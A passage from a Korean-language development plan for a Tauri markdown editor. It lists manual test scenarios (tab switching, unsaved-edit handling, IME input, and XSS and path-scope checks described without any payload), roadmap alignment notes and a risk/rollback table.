| 1 | A 편집(미저장) → B 열기 → A 재클릭 | 편집 유지, dirty 유지 |
| 2 | A 타이핑 직후 150ms 내 B 전환 | B dirty 아님, A 캐시에 반영 |
| 3 | A·B 20회 고속 전환 | 표시 문서 == 활성 탭 |
| 4 | Backspace 블록 병합 직후 탭 전환 | 병합 결과가 A에만 |
| 5 | H2(하위 H3 포함) 위/아래 드래그 | 서브트리 통째 이동, 자동 저장 없음 |
| 6 | H2를 자기 H3 위로 드롭 | 무동작, 크래시 없음 |
| 7 | dirty 탭 `Cmd+W` 취소 | 탭·내용 유지 |
| 8 | dirty 상태 앱 종료 취소 | 앱 유지 |
| 9 | 탐색기 파일 삭제 | 다이얼로그 없이 탭 정리 |
| 10 | XSS 페이로드 `.md` Read 모드 | 네트워크 0건, CSP 차단 로그 |
| 11 | 워크스페이스 외부 경로 invoke | `Err` 반환 |
| 12 | 이미지 붙여넣기 → 저장 → Read 모드 | 이미지 표시, 복사 버튼 동작 |
| 13 | IME(한글) 조합 중 탭 전환 / `Cmd+W` | 조합 문자 보존, 오발화 없음 |
| 14 | `pnpm tauri dev` / `build` | HMR·번들 모두 정상 |

---

## 9. 상위 로드맵 정합성

- **`implementation_plan` Sprint 3(렌더링/메모리 최적화)**: 착수 전 B1 완료가 게이트. Sprint 3의 "Base64 이미지 로딩 제거"는 본 계획 P0-1의 L2/L4(asset 프로토콜·런타임 스코프)를 전제로 하므로 **P0-1 → P1-8 순서 고정**.
- **`advanced_rendering_optimization` Phase 1**: P0-3 Stage B와 동일 작업. `TabViewState`/`serialize()`가 Phase 2 TTL 언마운터의 계약이 된다.
- **`advanced_rendering_optimization` §5**: P0-4는 TTL 언마운트 도입 시 **동일 결함이 전 탭에서 재현**되므로 선행 수정 필수(본 계획 B1에 포함).
- **`architecture_stages` Stage 1**: 본 계획의 `_snapshotActiveTab` / `updateContentForTab` / `saveFile(paneId, tabId)`는 향후 Rust 이관 시 `devoras_document_get_blocks` / `devoras_document_update_block` 과 **1:1 매핑 가능한 형태**로 설계했다.

---

## 10. 리스크 & 롤백

| 리스크 | 영향 | 완화 |
|---|---|---|
| CSP 도입으로 dev/prod 기동 실패 | 개발 중단 | `devCsp` 분리 + 별도 브랜치에서 dev/build 양쪽 선검증 |
| Tauri 런타임 스코프 API 명칭 불일치 | P0-1 L4 미적용 | 1시간 PoC 선행, 실패 시 정적 `$HOME/**` 유지 + L3 Rust 검증 의존(강도 하락 문서화) |
| DOMPurify가 hljs/katex 마크업 제거 | Read 모드 표시 깨짐 | `USE_PROFILES` + 시각 회귀(스크린샷) 확인 |
| `ownerTabId` 도입이 기존 흐름 파괴 | 편집 미반영 | `setBlocksFromContent` 호출부 전수 조사(현재 3곳: BlockEditor·FileExplorer·blockStore 내부) 후 단일 소유자로 축소 |
| 커밋 단위 비대화 | 롤백 난이도 | 커밋을 B0 / P0-2 / P0-4 / P0-6 / P0-5 / P0-1(L1·L2 / L3·L4 분리) 로 6~7개 분할, 각 커밋에 `BUG-20260826-0X` 레퍼런스 주석 부착 |
